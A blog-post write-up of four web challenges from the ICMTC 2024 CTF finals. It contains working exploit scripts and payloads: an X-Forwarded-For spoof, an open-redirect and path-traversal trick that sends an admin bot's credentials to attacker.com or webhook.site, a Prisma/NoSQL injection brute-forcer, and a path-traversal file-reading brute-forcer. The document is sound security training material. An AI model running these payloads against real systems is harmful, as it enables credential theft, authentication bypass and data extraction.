---
layout: post
title:  "ICMTC 2024 FINALS WEB CHALLENGES WRITEUP"
description: WEB WRITEUP FOR ICMTC CTF
image: 
  path: /assets/img/blog/icmtc.jpg
tags: CTF,sql_injection,NoSql_injection
date:   2024-07-28 13:49:56 +0300
category: CTFs
---
Hi I am Mohammed Ashraf AKA logan0x
and this is my Writeup for ICMTC FINALS 2024

![ASCWG.jpg](/assets/img/blog/icmtc.jpg)

# Restricted Network 
In this challenge we need to bypass the php filter to trick the server and make it think we are in the same network as him.

![restricted_network.webp](/assets/img/blog/icmtc/restricted_network.webp)

## Code analysis
first the server checks if http request method is `POST` and if true then the server checks if the header `X-Forwarded-For` is set or not if not it will give you error message and if set then we will go to the next check which is an `if condition` that checks if the value of `X-Forwarded-For` have the string `certrestrictednetwork.` in the position 0 using the code `stripos($xForwardedFor, 'certrestrictednetwork.') === 0` if true then the server will set the `$domain` variable to be equal to the string after the word `certrestrictednetwork.` and then the server will check if the value of `$domain` is equal to the value of `127.0.0.1` using the function `gethostbyname()` if true then the server will give you the flag.
PRETTY FORWARD CODE RIGHT?

just send a normal request with the header `X-Forwarded-For: certrestrictnetwork.localhost` and you will get the flag.

![restrictflag.webp](/assets/img/blog/icmtc/restricte_flag.webp)
the flag is encoded with a strange type of encoding that I don't know what it is but a identifier will know it, i used https://www.dcode.fr/cipher-identifier to identify the encoding and it was `base 91` so I decoded it and got the flag.

# Internship application

The challenge is white box and the source code is given to us.
```js
const express = require('express');
const bodyParser = require('body-parser');
const basicAuth = require('basic-auth');
const db = require('./database');


const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.set('view engine', 'ejs');

// Serve static files
app.use(express.static('public'));

const flag = 'EGCERT{placeholder}';


const adminUser = {
  name: 'admin',
  pass: 'admin'
};

// Authentication middleware
const auth = (req, res, next) => {
  const user = basicAuth(req);
  if (user && user.name === adminUser.name && user.pass === adminUser.pass) {
    return next();
  } else {
    res.set('WWW-Authenticate', 'Basic realm="example"');
    return res.status(401).send('Authentication required.');
  }
};

// Routes

app.get('/', (req, res) => {
    res.render('index');
  });


app.post('/submit', (req, res) => {
    const { email, cover_letter } = req.body;
    db.run("INSERT INTO submissions (email, cover_letter, approved) VALUES (?, ?, ?)", [email, cover_letter, 0], async function(err) {
      if (err) {
        if (err.message.includes('UNIQUE constraint failed')) {
          return res.status(400).send('Email already exists.');
        } else {
          return console.error(err.message);
        }
      }

  
      res.redirect('/redirect?url=thanks');
  
      // Hidden
      // Notify the admin to approve the application 

    });
  });




app.get('/admin', auth, (req, res) => {
  db.all("SELECT * FROM submissions", [], (err, rows) => {
    if (err) {
      throw err;
    }
    res.render('admin', { submissions: rows, flag: flag });
  });
});

app.get('/display/:id', auth, (req, res) => {
  const id = req.params.id;
  db.get("SELECT * FROM submissions WHERE id = ?", [id], (err, row) => {
    if (err) {
      return console.error(err.message);
    }
    res.render('display', { submission: row });
  });
});

app.get('/approve/:email', auth, (req, res) => {
  const email = req.params.email;
  db.run("UPDATE submissions SET approved = 1 WHERE email = ?", [email], (err) => {
    if (err) {
      return console.error(err.message);
    }
    res.sendStatus(200);
  });
});

app.get('/delete/:email', auth, (req, res) => {
  const email = req.params.email;
  db.run("DELETE FROM submissions WHERE email = ?", [email], (err) => {
    if (err) {
      return console.error(err.message);
    }
    res.sendStatus(200);
  });
});

app.get('/redirect', (req, res) => {
  const url = req.query.url;
  res.redirect(url);
});

app.get('/thanks', (req, res) => {
  res.render('thanks');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

```
## Code analysis
The server is a simple express server that serves a static file and has 8 routes:
1. `/` which renders the index page.
2. `/submit` which takes the email and cover letter from the body and inserts them into the database.
3. `/admin` which renders the admin page and shows all the submissions in the database.
4. `/display/:id` which renders the display page and shows the submission with the given id.
5. `/approve/:email` which approves the submission with the given email.
6. `/delete/:email` which deletes the submission with the given email.
7. `/redirect` which redirects to the given url.
8. `/thanks` which renders the thanks page.

The server uses basic authentication to protect the admin routes. The back end using library called `basic-auth` to get the username and password from the request and check if they are equal to the admin username and password. If they are equal, the server will call the next middleware, otherwise, it will return a 401 status code with the message `Authentication required.`.

> In the backend there is a bot that will approve the application automatically. they informed us in the competition.
## Vulnerability
1- You can see that `/redirect` route is vulnerable to open redirect attack because it takes the url from the query string and redirects to it without any validation. This can be exploited to redirect the admin to an attacker-controlled website and steal the admin's credentials.

2- There is no validation on the email field so we can insert any character in the email field and it will be inserted in the database. So imagine the scinario where the email field has no validation and being inserted as it's right after the `approve` endpoint in the url so if the email is equal to `email = ../` then when the bot trying to approve the application it will actually goes to the root directory `https://domain/approve/../ == https://domain/` 

## Exploitation
1- To exploit the open redirect vulnerability, and no email validation we can set the email to `../redirect?url=http://attacker.com` and when the bot tries to approve the application, it will redirect to `http://attacker.com` and we wil receive the admin credentials.
how the admin credentials will be sent to us? the admin credentials are sent in the request header `Authorization` this is how `basic-auth` works so we need to create a server that will receive the request and log the headers.

you can use webhook site like `webhook.site` to receive the request and log the headers.

![webhook](/assets/img/blog/icmtc/internship_creds.png)
The credentials are sent to us in the `Authorization` header and was base64 encoded but the webhook site decoded it for us.

now we need to set that header in our request to the `admin` endpoint and we will get the flag.


# Reveal Me

In this challenge we need to do `NoSQL injection` to bypass the login and get the flag. it's error based injection.

This is a black box challenge and the source code is not given to us.

the website have basic login form with email and password fields and also a register form.

if you loged in successfully you will find nothing but just a api to edit you profile details like `first name` and `last name` and `secret`, obvious that the secret is field is part of the challenge.

the website have forgot password functionality that sends the user a link to reset the password.

the website have about page that shows admin email.

First i thought we need to manipulate the JWT token but after some testing i found that the JWT token can not be manipulated.

Then i start testing for SQL injection and i found nothing.
Then I Found that the Framework is `express` and `nodejs` so i started testing for `NoSQL injection` as this framework usually using NoSQL databases like `MongoDB`.

and i successfully broke the reset password functionality.
![NoSql](/assets/img/blog/icmtc/NoSql.png)

after some searching about prisma syntax here is the syntax for the query on the server side.
```js
const user = await prisma.user.findUnique({
    where: {
      email: email, // email is the email that the user entered in the forgot password form
    },
  });
```
After some research i found that i can add another field to the query and it will be executed.
so i added a dummy field like `e` to show the error message. And fortunately the error message is very clear here is all the fields i can add beside the email field.
![NoSql](/assets/img/blog/icmtc/NoSql2.png)

Then let's get some new error
we will make the query like that :
```js
const user = await prisma.user.findUnique({
    where: {
      email: "admin@reveal.com"
    },
    password: {
      w: e
    }
  });

  ```
![NoSql](/assets/img/blog/icmtc/NoSql3.png)

And again the error message is very clear and it says that the argument `e` is not valid so we can't use it.

Then i tried to use the `startsWith` field and it worked.

What is we changed the query to be like this?
```js
const user = await prisma.user.findUnique({
    where: {
      email: "admin@reveal.com"
    },
    password: {
      startsWith: password
    }
  });
  ```
  Here is the json payload that i sent to the server.
  ```json
  {
    "email": "admin@reveal.com",
    "secret":{"startsWith":"a"}
  }
  ```

now we can brute force the secret field and get the flag.
why not brute force the password field? because the password field is hashed and we can't crack it.

why not the reset password token field? because it's being changed every time you request a reset password link.

## Exploitation
```python

import requests
import time
import urllib.parse

url = 'http://209.38.222.134:3000/api/auth/reset'
email = 'admin@reveal.com'
token_prefix = ''
alphabet = """A1BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_@!#$%^&*()[]-+=|;:,<>/?~ \n\t\r'"\`\\.""" 

def check_token(token):
    payload = {
        'email': email,
        'secret': {
            'startsWith': token_prefix + token
        }
    }
    headers = {'Content-Type': 'application/json'}
    response = requests.post(url, json=payload, headers=headers)
    
    if 'Reset email sent successfully.' in response.text:
        return True
    else:
        return False

def brute_force_token(base_token):
    while True:
        found = False
        for char in alphabet:
            encoded_char = urllib.parse.quote(char, safe='')
            test_token = base_token + encoded_char
            if check_token(test_token):
                base_token = test_token
                found = True
                print("Token until now : " + token_prefix + urllib.parse.unquote(base_token))
                break
        if not found:
            break
    return base_token

base_token = ''
result = brute_force_token(base_token)
print('Successfully brute forced token:', token_prefix + urllib.parse.unquote(result))
```
> The script will brute force the secret field and get the flag.

# File Pattern Challenge

This challenge is about finding the flag in a file that is being served by the server.\
The Flag path is in html comment in the front end source code.

![file_pattern](/assets/img/blog/icmtc/File_Pattern.png)

# Basic Test
i just started by playing with the pattern field to see what will happen 
![file_pattern](/assets/img/blog/icmtc/file_pattern2.png)

The output gives you the position of the `sequence` you entered in the `pattern` field.

# Exploitation
```import requests

url = "http://46.101.221.164:8080/"
filename = "../../../tmp/flag_21e0e99ddec45ab7a40a675175e2704d.txt"
characters = """ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_@!#$%^&*()[]-+=|;:,.<>/?~ \n\t\r'"\`\\"""

def check_pattern(pattern, line_number):
    data = {
        "filename": filename,
        "pattern": pattern
    }
    response = requests.post(url, data=data)
    return f"Line: {line_number}" in response.text

def print_and_log(message, file):
    print(message)
    file.write(message + '\n')
    file.flush()

def find_line_content(line_number, output_file):
    known_content = ""
    while True:
        found = False
        for char in characters:
            test_pattern = known_content + char
            if check_pattern(test_pattern, line_number):
                known_content = test_pattern
                print_and_log(f"Content found so far on line {line_number}: {repr(known_content)}", output_file)
                found = True
                if char == '\n':
                    print_and_log(f"End of line {line_number} found.", output_file)
                    return known_content
                break
        if not found:
            if known_content:
                print_and_log(f"No match found. Resetting search for line {line_number}.", output_file)
                known_content = ""
            else:
                print_and_log(f"No content found for line {line_number}.", output_file)
                return None

def main():
    with open('output.txt', 'w') as output_file:
        for line_number in range(1, 13):  # Check lines 1 to 12
            print_and_log(f"Searching content for line {line_number}", output_file)
            line_content = find_line_content(line_number, output_file)
            
            if line_content:
                print_and_log(f"Complete line content found for line {line_number}: {repr(line_content)}", output_file)
            else:
                print_and_log(f"No content found for line {line_number}.", output_file)
    
    print("Line content discovery process completed. Check output.txt for the full log.")

if __name__ == "__main__":
    main()
```
The script idea in detail :
1. the script will brute force by each character in the `characters` string and check if the word "Line: {line_number}" is in the response text because the server will return the line number if the word is found in the file and if not the server will return the word "No match found" so we can use this to check if the character is correct or not.

2. if the character is correct the script will continue to the next character and if all chars exhausted and no new character found the script will move to the next line.

3. the script will continue until it finds the flag.

> The script is very slow because it's checking each character in the `characters` string and it's not optimized but it will get the flag.

# Conclusion
This is my writeup for ICMTC 2024 Finals Web Challenges.
I hope you enjoyed it and learned something new.



